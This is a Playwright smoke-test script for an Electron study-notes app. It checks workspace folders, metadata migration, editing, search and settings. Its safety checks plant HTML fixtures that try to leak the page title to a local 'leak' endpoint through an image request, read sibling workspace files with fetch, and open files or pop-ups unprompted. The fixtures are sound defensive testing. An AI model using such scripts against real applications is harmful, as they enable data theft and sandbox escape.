// Smoke test: opens the built app on a temporary copy of sample-library/, clicks through it,
// checks the results and saves screenshots to scripts/. Exits with code 1 if any check fails.
// Uses its own settings folder, so your real settings and documents are never touched.
// Run with: npm run smoke
import { _electron as electron } from 'playwright-core'
import electronPath from 'electron'
import path from 'node:path'
import { tmpdir } from 'node:os'
import { fileURLToPath } from 'node:url'
import { spawn } from 'node:child_process'
import { createHash } from 'node:crypto'
import JSZip from 'jszip'
import { createServer } from 'node:http'
import { cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'

const here = path.dirname(fileURLToPath(import.meta.url))
const projectRoot = path.resolve(here, '..')
const workDir = mkdtempSync(path.join(tmpdir(), 'studydocs-smoke-'))
const library = path.join(workDir, 'library')
const userData = path.join(workDir, 'userdata')
cpSync(path.join(projectRoot, 'sample-library'), library, {
  recursive: true,
  filter: (src) => !path.basename(src).startsWith('.docs-meta')
})
// A second folder, so the whole test runs on a multi-folder workspace (think D:\Học + C:\notes).
const notes = path.join(workDir, 'notes')
mkdirSync(path.join(notes, 'devops'), { recursive: true })
writeFileSync(path.join(notes, 'devops', 'Docker cơ bản.md'), '# Docker cơ bản\n\nContainer chạy một tiến trình cô lập.\n')
// Tags and notes as v0.8 and older kept them: inside the documents' folder (review: migration).
writeFileSync(path.join(notes, 'devops', 'Kubernetes.md'), '# Kubernetes\n\nĐiều phối nhiều container.\n')
const legacyMeta = JSON.stringify({ version: 1, docs: { 'devops/Kubernetes.md': { tags: ['k8s'], status: 'review' } } })
writeFileSync(path.join(notes, '.docs-meta.json'), legacyMeta)
writeFileSync(path.join(notes, '.docs-notes.json'), JSON.stringify({ version: 1, docs: { 'devops/Kubernetes.md': { items: [], docNote: { text: 'Ghi chú từ bản cũ', updated: 1 } } } }))
// A web server on this PC, standing in for "the internet" in the safety checks.
const webHits = []
const SUB_ICS = ['BEGIN:VCALENDAR', 'VERSION:2.0', 'PRODID:-//Trường//TKB//VI', 'BEGIN:VEVENT', 'UID:tkb-toan@truong', 'DTSTAMP:20300101T000000Z', 'DTSTART:20300306T130000', 'DTEND:20300306T153000', 'SUMMARY:Toán rời rạc', 'LOCATION:C2', 'END:VEVENT', 'END:VCALENDAR'].join('\r\n')
const web = createServer((req, res) => {
  if (req.url === '/huge.ics') {
    res.writeHead(200, { 'Content-Type': 'text/calendar' })
    const mb = Buffer.alloc(1024 * 1024, 'A')
    let sent = 0
    const more = () => {
      while (sent < 22) {
        sent++
        if (!res.write(mb)) return void res.once('drain', more)
      }
      res.end()
    }
    res.on('close', () => (sent = 99))
    more()
    return
  }
  if (req.url === '/lich.ics') {
    res.writeHead(200, { 'Content-Type': 'text/calendar; charset=utf-8' })
    res.end(SUB_ICS)
    return
  }
  webHits.push(req.url)
  res.writeHead(200, { 'Content-Type': 'image/svg+xml' })
  res.end('<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>')
})
await new Promise((r) => web.listen(0, '127.0.0.1', r))
const WEB = `http://127.0.0.1:${web.address().port}`
// A page that tries to send something out from the PDF export window, through an image address.
writeFileSync(path.join(library, 'backend', 'Ảnh từ web.html'), `<!doctype html><html><head><meta charset="utf-8"><title>Ảnh từ web</title></head><body><h1>Ảnh từ web</h1><img src="${WEB}/own-picture.svg"><script>const i = new Image(); i.src = '${WEB}/leak?made-up=' + encodeURIComponent(document.title); document.body.append(i)</script></body></html>`)
// Files for the safety checks (issues #1, #2, #3).
const ATTACK = 'backend/Tài liệu lạ.html'
writeFileSync(
  path.join(library, 'backend', 'Tài liệu lạ.html'),
  `<!doctype html><html><head><meta charset="utf-8"><title>Tài liệu lạ</title></head><body><h1>Tài liệu lạ</h1>
<p>Bài này thử làm những việc không được phép.</p>
<script>
  const params = new URLSearchParams(location.search)
  // #2: try to read other files of the workspace
  ;(async () => {
    const out = []
    for (const u of ['../.docs-meta.json', '../frontend/React%20useEffect.md']) {
      try {
        const r = await fetch(u)
        out.push(r.ok ? 'READ' : 'status' + r.status)
      } catch {
        out.push('blocked')
      }
    }
    document.body.dataset.result = out.join(',')
  })()
  // #1: open another file without anyone clicking
  const act = () => {
    if (location.hash === '#run-py') location = 'tool.py'
    if (location.hash === '#run-txt') location = 'slides.pptx'
    if (location.hash === '#popups') for (let i = 0; i < 5; i++) window.open('https://example.com/tab' + i)
  }
  act()
  addEventListener('hashchange', act)
</script></body></html>`
)
writeFileSync(path.join(library, 'backend', 'tool.py'), 'print("this must never run")\n')
writeFileSync(path.join(library, 'backend', 'slides.pptx'), 'not opened by the app')
// A book whose outline points at sections inside ONE file (common in real books): the
// outline must follow the page you are on, not stay on the first section of that file.
{
  const para = (n) => Array.from({ length: 40 }, (_, i) => `<p>Đoạn ${i + 1} của phần ${n}. Viết dài một chút để mỗi phần chiếm vài trang khi đọc.</p>`).join('')
  const zip = new JSZip()
  zip.file('mimetype', 'application/epub+zip', { compression: 'STORE' })
  zip.file('META-INF/container.xml', '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
  zip.file('OEBPS/book.xhtml', `<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Một file</title></head><body>${[1, 2, 3].map((n) => `<h2 id="s${n}">Phần ${n}</h2>${para(n)}`).join('')}</body></html>`)
  zip.file('OEBPS/nav.xhtml', '<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>Mục lục</title></head><body><nav epub:type="toc"><ol>' + [1, 2, 3].map((n) => `<li><a href="book.xhtml#s${n}">Phần ${n}</a></li>`).join('') + '</ol></nav></body></html>')
  zip.file('OEBPS/content.opf', '<?xml version="1.0" encoding="utf-8"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">mot-file</dc:identifier><dc:title>Sách một file</dc:title><dc:language>vi</dc:language></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="b" href="book.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="b"/></spine></package>')
  writeFileSync(path.join(library, 'sach', 'Sách một file.epub'), await zip.generateAsync({ type: 'nodebuffer' }))
}
const CRLF = 'frontend/Windows note.md'
writeFileSync(path.join(library, 'frontend', 'Windows note.md'), '# Windows note\r\n\r\nDòng một.\r\nDòng hai.\r\n')
const file = (rel) => path.join(library, rel)
const read = (rel) => readFileSync(file(rel), 'utf8')
// Tags and notes live in the app's data folder, one sub-folder per workspace folder, named
// by a short hash of the folder's path (same as rootKeyOf in src/main/workspace.ts).
const keyOf = (dir) => createHash('sha1').update(path.resolve(dir).toLowerCase()).digest('hex').slice(0, 8)
const dataDir = (dir) => path.join(userData, 'data', keyOf(dir))
const metaFile = path.join(dataDir(library), 'meta.json')
const shot = (name) => path.join(here, `${name}.png`)

const ES = 'backend/Event Sourcing.html'
const ROADMAP = 'backend/Lộ trình Backend.html'
const REACT = 'frontend/React useEffect.md'

let failures = 0
/** Prints the step name, so a timeout shows where it happened. */
const step = (name) => console.log(`
# ${name}`)
function check(ok, label) {
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}`)
  if (!ok) failures++
}

// Start from a corrupt meta file, like after a bad sync conflict.
// The checks below read the Vietnamese texts; a new install would follow the language of Windows.
mkdirSync(userData, { recursive: true })
writeFileSync(path.join(userData, 'settings.json'), JSON.stringify({ ui: { language: 'vi' } }))
mkdirSync(dataDir(library), { recursive: true })
writeFileSync(metaFile, '{ "version": 1, "docs": { <<<<<<< HEAD')

const app = await electron.launch({
  executablePath: electronPath,
  // Keep drawing even when the test window is covered by other windows: Windows/Chromium
  // stop painting hidden windows, and screenshots then wait forever (issue #16).
  args: ['--disable-features=CalculateNativeWinOcclusion', '--disable-backgrounding-occluded-windows', '--disable-renderer-backgrounding', projectRoot],
  env: { ...process.env, STUDYDOCS_DEBUG: '1', DOCS_LIBRARY: [library, notes].join(path.delimiter), STUDYDOCS_USER_DATA: userData }
})
const errors = []
let mainLog = ''
app.process().stdout?.on('data', (d) => (mainLog += d))
app.process().stderr?.on('data', (d) => (mainLog += d))
const page = await app.firstWindow()
// Errors of the app itself. Messages from inside documents (doc://...) don't count: the test
// library has a page that deliberately tries forbidden things, and those must fail.
// The OCR engine prints harmless notes about settings its language data mentions ("Parameter not found").
page.on(
  'console',
  (m) =>
    m.type() === 'error' &&
    !m.location().url.startsWith('doc://') &&
    !/doc:\/\/library\//.test(m.text()) &&
    !m.text().startsWith('Warning: Parameter not found') &&
    errors.push(`${m.text()} (${m.location().url})`)
)
page.on('pageerror', (e) => errors.push(String(e)))
let dialogAnswer = 'dismiss'
/**
 * Questions are the app's own dialogs (dialog.ask). A small helper inside the page answers
 * each one as soon as it opens: "accept" clicks the first button, "dismiss" the cancel one.
 * It also counts them (window.__smokeAsked).
 */
const setAnswer = async (a) => {
  // A question asked just before is answered with the previous answer first.
  if (dialogAnswer !== 'hold') {
    await page.waitForTimeout(150)
    await page.waitForFunction(() => !document.querySelector('dialog.ask[open]'), null, { timeout: 5000 }).catch(() => {})
  }
  dialogAnswer = a
  await page.evaluate((x) => (window.__smokeAnswer = x), a)
}
const installAnswerer = () =>
  page.evaluate(() => {
    window.__smokeAnswer ??= 'dismiss'
    window.__smokeAsked ??= 0
    setInterval(() => {
      const d = document.querySelector('dialog.ask[open]')
      if (!d || d.dataset.smoke || window.__smokeAnswer === 'hold') return
      d.dataset.smoke = '1'
      window.__smokeAsked++
      d.querySelector(`[data-answer="${window.__smokeAnswer === 'accept' ? 'ok' : 'cancel'}"]`).click()
    }, 50)
  })
// A dialog may already be gone when Playwright answers it; that must not crash the test.
page.on('dialog', (d) => void (dialogAnswer === 'accept' ? d.accept() : d.dismiss()).catch(() => {}))
await page.setViewportSize({ width: 1320, height: 860 })
await page.emulateMedia({ colorScheme: null }) // Playwright forces "light" by default; let the app decide

/** Settings are in tabs (Giao diện, Đọc, Thư viện, Dữ liệu, Cập nhật). */
const settingsTab = (name) => page.click(`dialog.settings .settings-tabs >> text=${name}`)
const openDoc = (title) => page.click(`.doc-list .row.doc >> text=${title}`)
const docPathIs = (p) => page.waitForSelector(`.doc-path:text-is("${p}")`, { timeout: 5000 })
/**
 * The edit page has been painted. Right after the frame switches to edit mode, a click can reach
 * the page before its first paint and is lost (only a test is that fast).
 */
const painted = async (frame) => {
  await frame.evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))))
}
const editPage = async () => {
  let fr = null
  for (let i = 0; i < 100 && !fr; i++) {
    fr = page.frames().find((x) => x.url().includes('?edit=1')) ?? null
    if (!fr) await page.waitForTimeout(100)
  }
  if (!fr) {
    const frame = await page.evaluate(() => [...document.querySelectorAll('iframe.html-frame')].map((f) => f.className + ' ' + f.src))
    throw new Error(`the page did not switch to edit mode: ${JSON.stringify(frame)} | frames: ${JSON.stringify(page.frames().map((x) => x.url()))}`)
  }
  await fr.waitForSelector('[data-sd-block]')
  await painted(fr)
  return fr
}
const editBarGone = () => page.waitForSelector('.edit-bar', { state: 'detached', timeout: 5000 })

try {
  await page.waitForSelector('.sidebar')
  await installAnswerer()

  // 1. Corrupt meta file: backed up and reported, not silently dropped.
  step("1. Corrupt meta file: backed up and reported, not silently dropped.")
  await page.waitForSelector('.banner:has-text("đã được sao lưu thành")')
  check(true, 'corrupt meta file shows a warning')
  check(readdirSync(dataDir(library)).some((f) => f.startsWith('meta.corrupt-')), 'corrupt meta file was backed up')
  check((await page.locator('.banner:has-text("Khôi phục…")').count()) === 1, 'a banner offers to recover the backup (issue #25)')
  await page.click('.banner:has-text("đã được sao lưu thành") button[aria-label="Ẩn cảnh báo"]')

  // 1b. Two folders in one workspace: each is a top-level node in the tree.
  step("1b. Two folders in one workspace: each is a top-level node in the tree.")
  const rootNames = await page.locator('.root-row .row.root .row-title').allTextContents()
  check(rootNames.join('|') === 'library|notes', `both folders shown as roots (${rootNames.join(', ')})`)
  check((await page.textContent('.library-name')).includes('2 thư mục'), 'header says the workspace has 2 folders')
  await page.fill('.search input', 'container')
  await page.waitForSelector('.hit:has-text("Docker cơ bản")')
  check((await page.textContent('.hit:has-text("Docker cơ bản") .hit-path')) === 'notes / devops', 'search finds docs in the second folder, with its name')
  await page.click('.hit:has-text("Docker cơ bản")')
  await docPathIs('devops/Docker cơ bản.md')
  check((await page.textContent('.doc-root')) === 'notes', 'doc header shows which folder the doc is in')
  await page.fill('.search input', '')
  await page.fill('.tag-editor input', 'devops')
  await page.press('.tag-editor input', 'Enter')
  await page.waitForTimeout(300)
  const notesMeta = JSON.parse(readFileSync(path.join(dataDir(notes), 'meta.json'), 'utf8')).docs
  check(notesMeta['devops/Docker cơ bản.md']?.tags?.[0] === 'devops', "tags are stored in the app's data folder, per workspace folder")
  const notesNotes = JSON.parse(readFileSync(path.join(dataDir(notes), 'notes.json'), 'utf8')).docs
  check(
    notesMeta['devops/Kubernetes.md']?.tags?.[0] === 'k8s' && notesMeta['devops/Kubernetes.md']?.status === 'review' && notesNotes['devops/Kubernetes.md']?.docNote?.text === 'Ghi chú từ bản cũ',
    'tags, status and notes of v0.8 and older (.docs-*.json in the folder) are read in'
  )
  check(
    readFileSync(path.join(notes, '.docs-meta.json'), 'utf8') === legacyMeta && JSON.parse(readFileSync(path.join(dataDir(notes), 'info.json'), 'utf8')).legacyImported === true,
    'the old files are left untouched, and not read again'
  )
  check(JSON.parse(readFileSync(path.join(dataDir(notes), 'info.json'), 'utf8')).path === notes, 'the data folder says which folder it belongs to')
  await page.screenshot({ path: shot('0-two-folders') })

  // 2. HTML document renders in the sandboxed iframe.
  step("2. HTML document renders in the sandboxed iframe.")
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  const frame = page.frameLocator('iframe.html-frame')
  await frame.locator('h1').waitFor()
  check((await frame.locator('h1').textContent()) === 'Event Sourcing', 'HTML doc renders')
  check((await frame.locator('figure svg').count()) === 7, 'all 7 diagrams render')
  await page.screenshot({ path: shot('1-html-doc') })

  // 3. Status + tag are saved; two writes at the same time both survive.
  step("3. Status + tag are saved; two writes at the same time both survive.")
  await page.click('.segmented >> text=Đang học')
  await page.fill('.tag-editor input', 'backend')
  await page.press('.tag-editor input', 'Enter')
  await page.evaluate(async (rel) => {
    // Documents are addressed by workspace id "<folder key>/<path>".
    const id = (await window.api.getLibrary()).docs.find((d) => d.rel === rel).path
    await Promise.all([window.api.updateMeta(id, { status: 'review' }), window.api.updateMeta(id, { tags: ['react'] })])
  }, REACT)
  const saved = JSON.parse(readFileSync(metaFile, 'utf8')).docs
  check(saved[ES]?.status === 'learning' && saved[ES]?.tags?.includes('backend'), 'status and tag saved')
  check(saved[REACT]?.status === 'review' && saved[REACT]?.tags?.[0] === 'react', 'concurrent writes both kept')
  check(!JSON.stringify(saved).includes('lastOpened'), '"recently opened" is not written into the library')

  step('3b. Tags already used are suggested with their document counts, and picked with the keyboard')
  await openDoc('Lộ trình Backend')
  await docPathIs(ROADMAP)
  await page.click('.tag-editor input')
  await page.waitForSelector('.tag-suggest .tag-suggest-item')
  check((await page.textContent('.tag-suggest-title')) === 'Tag đã có', 'clicking the tag box lists the tags in use')
  await page.keyboard.type('BÁC') // accents and case don't matter
  await page.waitForSelector('.tag-suggest-item:has-text("#backend")')
  const backendCount = await page.textContent('.tag-suggest-item:has-text("#backend") .tag-suggest-count')
  check(backendCount === "1", `"bác" suggests #backend with how many documents have it (${backendCount})`)
  await page.keyboard.press('ArrowDown')
  await page.keyboard.press('Enter')
  await page.waitForSelector('.tag-editor .tag:has-text("#backend")')
  await page.waitForTimeout(300)
  check(JSON.parse(readFileSync(metaFile, 'utf8')).docs[ROADMAP]?.tags?.includes('backend'), 'the picked tag is saved on the document')
  await page.keyboard.type('chu de moi')
  await page.waitForSelector('.tag-suggest-item.new')
  check((await page.textContent('.tag-suggest-item.new')).includes('#chu de moi'), 'a tag not used yet is offered as a new tag')
  await page.keyboard.press('Escape')
  check((await page.locator('.tag-suggest').count()) === 0 && (await page.locator('.edit-bar').count()) === 0, 'Esc closes the list (and nothing else)')
  await page.fill('.tag-editor input', '')
  await page.click('.tag-editor .tag:has-text("#backend") button')
  await page.waitForTimeout(300)

  // 4. Links inside HTML switch the whole app to the target doc, including #hash.
  step("4. Links inside HTML switch the whole app to the target doc, including #hash.")
  await openDoc('Lộ trình Backend')
  await page.frameLocator('iframe.html-frame').locator('#link-concurrency').click()
  await docPathIs(ES)
  check((await page.getAttribute('iframe.html-frame', 'src')).endsWith('#s7'), 'HTML link opens the target doc at #s7')
  await openDoc('Lộ trình Backend')
  // Wait for the page itself: the frame of the page before may still be there for a moment.
  await docPathIs(ROADMAP)
  await page.waitForFunction(() => document.querySelector('iframe.html-frame')?.src.includes('L%E1%BB%99%20tr%C3%ACnh'))
  await page.waitForTimeout(300)
  await page.frameLocator('iframe.html-frame').locator('#link-react').click()
  await docPathIs(REACT)
  check(true, 'HTML link opens a Markdown doc')

  // 5. Markdown with Mermaid, in-doc anchor and cross-doc link.
  step("5. Markdown with Mermaid, in-doc anchor and cross-doc link.")
  await page.waitForSelector('.markdown pre.mermaid svg g.node', { timeout: 15000 })
  check(true, 'Mermaid diagram renders')
  await page.click('.markdown a[href="#bang-tom-tat"]')
  await page.waitForTimeout(800)
  check((await page.evaluate(() => document.querySelector('.md-scroll').scrollTop)) > 100, 'in-doc #anchor scrolls')
  await page.click('.markdown >> text=Event Sourcing')
  await docPathIs(ES)
  check(true, 'Markdown link opens another doc')

  // 6. Search, filters.
  step("6. Search, filters.")
  await page.fill('.search input', 'su kien')
  await page.waitForSelector('.hit')
  check((await page.textContent('.hit mark')) === 'sự kiện', 'search "su kien" highlights "sự kiện"')
  await page.fill('.search input', '')
  await page.click('.filters >> text=Đang học')
  check((await page.locator('.doc-list .row.doc').count()) === 1, 'status filter')
  await page.click('.filters >> text=Tất cả')

  // 7. Recently opened lives in a popover (Ctrl+E), not in the sidebar list.
  step("7. Recently opened lives in a popover (Ctrl+E), not in the sidebar list.")
  check((await page.locator('.doc-list >> text=Mở gần đây').count()) === 0, 'sidebar has no "recently opened" block')
  await page.keyboard.press('Control+E')
  await page.waitForSelector('.recent-popover')
  check((await page.locator('.recent-popover .row.doc').count()) >= 3, 'Ctrl+E shows recently opened docs')
  await page.screenshot({ path: shot('2-recent-popover') })
  await page.keyboard.press('Escape')
  check((await page.locator('.recent-popover').count()) === 0, 'Escape closes the popover')

  // 8. Settings: dark mode, accent colour, reading size; saved to the settings file.
  step("8. Settings: dark mode, accent colour, reading size; saved to the settings file.")
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await page.waitForSelector('dialog.settings[open]')
  await settingsTab('Giao diện')
  await page.click('dialog.settings >> text=Tối')
  await page.click('dialog.settings .swatch[title="Xanh ngọc"]')
  await settingsTab('Đọc')
  await page.fill('dialog.settings input[type=range]', '19')
  await page.waitForTimeout(600)
  check(await app.evaluate(({ nativeTheme }) => nativeTheme.shouldUseDarkColors), 'dark mode set for the window')
  check(await page.evaluate(() => matchMedia('(prefers-color-scheme: dark)').matches), 'dark mode applies to the page')
  check((await page.evaluate(() => document.documentElement.style.getPropertyValue('--accent-base'))) === '#0f766e', 'accent colour applies')
  await page.screenshot({ path: shot('3-settings-dark') })
  const settings = JSON.parse(readFileSync(path.join(userData, 'settings.json'), 'utf8'))
  check(settings.ui?.theme === 'dark' && settings.ui?.accent === '#0f766e' && settings.ui?.readingSize === 19, 'settings saved')
  await page.click('dialog.settings >> text=Xong')
  await openDoc('React useEffect — khi nào chạy?')
  await page.waitForSelector('.markdown pre.mermaid svg g.node', { timeout: 15000 })
  check((await page.evaluate(() => getComputedStyle(document.querySelector('.markdown')).fontSize)) === '19px', 'reading size applies to Markdown')
  await page.screenshot({ path: shot('4-markdown-dark') })
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await page.click('dialog.settings >> text=Khôi phục mặc định')
  await page.click('dialog.settings >> text=Xong')
  await page.waitForTimeout(400)
  check((await app.evaluate(({ nativeTheme }) => nativeTheme.themeSource)) === 'system', 'settings reset to default')

  // English interface, then back to Vietnamese.
  step('8b. Language')
  // With unsaved edits (Raw), switching asks first (it redraws the window); "no" keeps everything.
  await page.click('.doc-controls >> text=Raw')
  await page.waitForSelector('.raw-host .cm-content')
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+End')
  await page.keyboard.type(' (dở)')
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Giao diện')
  await setAnswer('dismiss')
  await page.click('dialog.settings >> text=English')
  await page.waitForTimeout(500)
  check(
    (await page.locator('dialog.settings .settings-tabs >> text=Giao diện').count()) === 1 && (await page.locator('.raw-toolbar .dirty-dot').count()) === 1,
    'switching language while editing asks first ("no" keeps the language and the edit)'
  )
  await page.click('dialog.settings >> text=Xong')
  await setAnswer('accept')
  await page.click('.raw-toolbar >> text=Đóng raw')
  await page.waitForSelector('.raw-toolbar', { state: 'detached' })
  await setAnswer('dismiss')
  await page.click('.sidebar-head .icon-btn[title="Cài đặt"]')
  await settingsTab('Giao diện')
  await page.click('dialog.settings >> text=English')
  await page.waitForSelector('dialog.settings .settings-tabs >> text=Appearance')
  const english = await page.evaluate(() => ({
    search: document.querySelector('.search input')?.getAttribute('placeholder'),
    status: [...document.querySelectorAll('.filters .chip')].map((c) => c.textContent.replace(/\d+/g, '').trim()).slice(0, 2),
    lang: document.documentElement.lang
  }))
  check(english.search?.startsWith('Search documents') && english.status.join('|') === 'All|Not started' && english.lang === 'en', `the interface switches to English (${english.search}; ${english.status.join(', ')})`)
  await page.waitForTimeout(600) // settings are saved a moment after the last change
  check(JSON.parse(readFileSync(path.join(userData, 'settings.json'), 'utf8')).ui?.language === 'en', 'the language is saved')
  await page.screenshot({ path: shot('3b-english') })
  await page.click('dialog.settings >> text=Tiếng Việt')
  await page.waitForSelector('dialog.settings .settings-tabs >> text=Giao diện')
  await page.click('dialog.settings >> text=Xong')

  // 9. Inline text edit in Markdown: only the typed text changes in the file.
  step("9. Writing in an existing Markdown note: only the typed text changes in the file.")
  const mdBefore = read(REACT)
  check((await page.locator('.doc-controls >> text=Sửa chữ').count()) === 0, 'Markdown notes are written in the editor ("Sửa chữ" is for HTML only)')
  await page.click('.doc-controls >> text=Viết')
  await page.waitForSelector('.md-editor .cm-content')
  await page.waitForFunction(() => document.querySelector('.md-editor .cm-content').textContent.includes('Mảng phụ thuộc'))
  // Ctrl+F in the editor: find a phrase, then type right after it.
  const typeAfter = async (phrase, text, back = 0) => {
    await page.click('.md-editor .cm-content')
    await page.keyboard.press('Control+F')
    await page.waitForSelector('.md-editor .cm-search input[name=search]')
    // Typed key by key: the search box takes the text on key presses (as when you type it).
    await page.keyboard.type(phrase)
    await page.press('.md-editor .cm-search input[name=search]', 'Enter')
    await page.press('.md-editor .cm-search input[name=search]', 'Escape')
    await page.keyboard.press('ArrowRight')
    for (let i = 0; i < back; i++) await page.keyboard.press('ArrowLeft')
    if (text) await page.keyboard.type(text)
  }
  await typeAfter('chạy lại lúc nào.', ' Rất quan trọng!')
  // The table cell, not the diagram above it: 'lần render đầu |', then back before ' |'.
  await typeAfter('lần render đầu |', '', 2)
  await page.keyboard.type(' tiên')
  await page.screenshot({ path: shot('5-md-inline-edit') })
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.md-toolbar .dirty-dot'))
  const mdAfter = read(REACT)
  check(
    mdAfter === mdBefore.replace('chạy lại lúc nào.', 'chạy lại lúc nào. Rất quan trọng!').replace('lần render đầu |', 'lần render đầu tiên |'),
    'Ctrl+F finds in the editor, and only the typed text changes in the file'
  )
  // Typing more saves by itself a moment later.
  await page.keyboard.type('!')
  await page.waitForSelector('.md-toolbar .saved-note', { timeout: 5000 })
  await page.waitForFunction(() => !document.querySelector('.md-toolbar .dirty-dot'), null, { timeout: 5000 })
  check(read(REACT) === mdAfter.replace('lần render đầu tiên |', 'lần render đầu tiên! |'), 'the editor saves by itself shortly after you stop typing')
  const errorsBefore = await page.locator('.toast.error').count()
  await page.keyboard.type('?')
  await page.waitForTimeout(1150) // the editor's own save is about to start
  await page.keyboard.press('Control+S')
  await page.keyboard.press('Control+S')
  await page.keyboard.type('?')
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.md-toolbar .dirty-dot'), null, { timeout: 5000 })
  await page.waitForTimeout(1500)
  check(
    (await page.locator('.toast.error').count()) === errorsBefore && read(REACT).includes('lần render đầu tiên!?? |'),
    'saves that overlap (Ctrl+S during the automatic save) run one after another: no false "changed outside the app"'
  )
  writeFileSync(file(REACT), mdAfter)
  await page.click('.md-toolbar >> text=Xong')
  await page.waitForSelector('.md-editor', { state: 'detached' })

  // 10. Inline text edit in HTML: only that element's text changes in the file.
  step("10. Inline text edit in HTML: only that element's text changes in the file.")
  const htmlBefore = read(ES)
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await page.click('.doc-controls >> text=Sửa chữ')
  const editFrame = page.frameLocator('iframe.html-frame.editing')
  await editFrame.locator('h1[data-sd-block]').waitFor()
  await editPage()
  await editFrame.locator('h1').click()
  await page.keyboard.press('End')
  await page.keyboard.type(' cơ bản')
  await editFrame.locator('.sub').click()
  await page.keyboard.press('Control+End')
  await page.keyboard.type(' Chúc học vui!')
  await page.keyboard.press('Enter') // a blank line, taken back with Backspace: nothing is added to the file
  await page.keyboard.press('Backspace')
  await page.screenshot({ path: shot('6-html-inline-edit') })
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await editBarGone()
  await page.waitForTimeout(500)
  const htmlAfter = read(ES)
  check(
    htmlAfter === htmlBefore.replace('<h1>Event Sourcing</h1>', '<h1>Event Sourcing cơ bản</h1>').replace('lên production.</p>', 'lên production. Chúc học vui!</p>'),
    'HTML inline edit changes only the typed text (a blank line taken back is not saved)'
  )
  await page.frameLocator('iframe.html-frame').locator('h1 >> text=Event Sourcing cơ bản').waitFor()
  check(true, 'HTML view reloads with the saved text')

  // Issue #26: text inside an SVG diagram can be edited too (through a small text box).
  const svgBefore = read(ES)
  await page.click('.doc-controls >> text=Sửa chữ')
  await editFrame.locator('text[data-sd-svg] >> text=(ghi đè mỗi lần đổi)').click()
  await editFrame.locator('input[data-studydocs]').fill('(ghi đè & mất lịch sử)')
  await editFrame.locator('input[data-studydocs]').press('Enter')
  await page.screenshot({ path: shot('6b-svg-text-edit') })
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await editBarGone()
  await page.waitForTimeout(500)
  check(read(ES) === svgBefore.replace('>(ghi đè mỗi lần đổi)</text>', '>(ghi đè &amp; mất lịch sử)</text>'), 'SVG text edit changes only that text in the file (escaped)')
  const svgAfter = read(ES)

  // 11. Unsaved changes: switching docs asks first (dismissed = stay), Esc + confirm cancels.
  step("11. Unsaved changes: switching docs asks first (dismissed = stay), Esc + confirm cancels.")
  await page.click('.doc-controls >> text=Sửa chữ')
  await editPage()
  await page.frameLocator('iframe.html-frame.editing').locator('h1[data-sd-block]').click()
  await page.keyboard.type('XYZ')
  await page.waitForTimeout(200)
  await setAnswer('dismiss')
  await openDoc('Lộ trình Backend')
  check((await page.textContent('.doc-path')) === ES, 'switching docs with unsaved edits asks and stays')
  await setAnswer('accept')
  await page.click('.edit-bar >> text=Huỷ (Esc)')
  await editBarGone()
  check(read(ES) === svgAfter, 'cancelled edit does not touch the file')

  // 12. Edit refused if the file changed on disk meanwhile.
  step("12. Edit refused if the file changed on disk meanwhile.")
  await openDoc('Lộ trình Backend')
  await docPathIs(ROADMAP) // or "Sửa chữ" may still belong to the document before
  await page.click('.doc-controls >> text=Sửa chữ')
  await editPage()
  await page.frameLocator('iframe.html-frame.editing').locator('h1[data-sd-block]').click()
  await page.keyboard.type('!')
  const external = read(ROADMAP).replace('Trang mẫu', 'Trang mẫu (sửa ở app khác)')
  writeFileSync(file(ROADMAP), external)
  await page.waitForTimeout(300)
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await page.waitForSelector('.toast >> text=thay đổi bên ngoài', { timeout: 5000 })
  check(read(ROADMAP) === external, 'conflicting save is refused and the other change is kept')
  await page.waitForSelector('.edit-bar', { state: 'detached' })

  // 13. Raw editor: live Markdown preview, Ctrl+S saves.
  step("13. Raw editor: live Markdown preview, Ctrl+S saves.")
  await openDoc('React useEffect — khi nào chạy?')
  await page.click('.doc-controls >> text=Raw')
  await page.waitForSelector('.raw-host .cm-content')
  await page.waitForFunction(() => document.querySelector('.cm-content')?.textContent.includes('useEffect'))
  await page.click('.raw-host .cm-content')
  await page.keyboard.press('Control+End')
  await page.keyboard.type('\n\nThêm từ raw editor.')
  await page.waitForSelector('.markdown >> text=Thêm từ raw editor.', { timeout: 5000 })
  check(true, 'raw editor shows a live preview')
  await page.screenshot({ path: shot('7-raw-editor') })
  await page.keyboard.press('Control+S')
  await page.waitForFunction(() => !document.querySelector('.raw-toolbar .dirty-dot'), null, { timeout: 5000 })
  check(read(REACT).trimEnd().endsWith('Thêm từ raw editor.'), 'raw editor saves with Ctrl+S')
  await page.click('.raw-toolbar >> text=Đóng raw')

  // 14. Outline panel for an HTML doc: lists the headings and jumps to one.
  step("14. Outline panel")
  await openDoc('Event Sourcing — Bài học để chép vào vở')
  await page.waitForFunction(() => document.querySelectorAll('.outline-item').length >= 12, null, { timeout: 8000 })
  check(true, 'outline lists the HTML headings')
  await page.click('.outline-item >> text=Concurrency — Optimistic')
  await page.waitForTimeout(1500)
